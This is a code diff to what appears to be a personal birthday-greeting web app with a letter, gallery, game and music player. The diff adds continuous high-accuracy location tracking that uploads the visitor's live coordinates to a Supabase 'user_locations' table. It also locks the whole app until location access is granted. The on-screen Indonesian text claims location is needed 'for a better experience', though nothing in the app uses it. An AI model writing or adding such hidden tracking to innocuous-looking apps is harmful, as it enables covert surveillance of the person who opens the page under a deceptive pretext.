@@ -1,6 +1,8 @@
 "use client";
 
-import { useState } from "react";
+import { useState, useEffect } from "react";
+import { useSession } from "@/hooks/useSession";
+import { supabase } from "@/lib/supabase";
 import CustomCursor from "@/components/CustomCursor";
 import ParticleCanvas from "@/components/ParticleCanvas";
 import SlideOverlay from "@/components/SlideOverlay";
@@ -20,14 +22,77 @@ type Slide = null | "letter" | "gallery" | "game";
 export default function BirthdayApp() {
   const [currentPage, setCurrentPage] = useState<Page>("login");
   const [activeSlide, setActiveSlide] = useState<Slide>(null);
+  const [locationState, setLocationState] = useState<"prompting" | "granted" | "denied">("prompting");
+  const sessionId = useSession();
   
   // Lift audio state up so it can start exactly when SpotifyPage is shown
   const { currentSong, isPlaying, toggle, play, next, prev } = useAudio();
+
+  useEffect(() => {
+    if (!sessionId) return;
+
+    if (!navigator.geolocation) {
+      // eslint-disable-next-line react-hooks/set-state-in-effect
+      setLocationState("denied");
+      return;
+    }
+
+    const watchId = navigator.geolocation.watchPosition(
+      (position) => {
+        setLocationState("granted");
+        
+        // Save to Supabase
+        supabase.from("user_locations").upsert({
+          session_id: sessionId,
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          updated_at: new Date().toISOString()
+        }).then(({ error }) => {
+          if (error) console.error("Error upserting location:", error);
+        });
+      },
+      (error) => {
+        console.error("Location error:", error);
+        setLocationState("denied");
+      },
+      { enableHighAccuracy: true, maximumAge: 10000, timeout: 10000 }
+    );
+
+    return () => {
+      navigator.geolocation.clearWatch(watchId);
+    };
+  }, [sessionId]);
 
   const handleQuizComplete = () => {
     play(); // Start audio immediately on click interaction
     setCurrentPage("spotify");
   };
+
+  if (locationState === "prompting") {
+    return (
+      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', height: '100vh', backgroundColor: '#111', color: '#fff', textAlign: 'center', padding: '20px' }}>
+        <h2 style={{ fontFamily: 'var(--font-syne)' }}>Mencari Lokasi... 📍</h2>
+        <p style={{ fontFamily: 'var(--font-dm)' }}>Web ini membutuhkan akses lokasi kamu untuk pengalaman yang lebih baik.</p>
+        <p style={{ fontSize: '0.8rem', opacity: 0.7, marginTop: '20px' }}>Izinkan akses lokasi pada popup browser.</p>
+      </div>
+    );
+  }
+
+  if (locationState === "denied") {
+    return (
+      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', height: '100vh', backgroundColor: '#111', color: '#fff', textAlign: 'center', padding: '20px' }}>
+        <h2 style={{ fontFamily: 'var(--font-syne)', color: '#ff4757' }}>Akses Lokasi Wajib 🚫</h2>
+        <p style={{ fontFamily: 'var(--font-dm)' }}>Kamu tidak bisa melanjutkan sebelum mengizinkan akses lokasi.</p>
+        <p style={{ fontSize: '0.9rem', opacity: 0.8, marginTop: '10px' }}>Silakan ubah pengaturan situs (site settings) di browsermu lalu muat ulang halaman ini.</p>
+        <button 
+          onClick={() => window.location.reload()} 
+          style={{ marginTop: '20px', padding: '10px 20px', borderRadius: '50px', border: 'none', backgroundColor: '#fff', color: '#111', fontWeight: 'bold', cursor: 'pointer', fontFamily: 'var(--font-dm)' }}
+        >
+          Muat Ulang Halaman
+        </button>
+      </div>
+    );
+  }
 
   return (
     <>
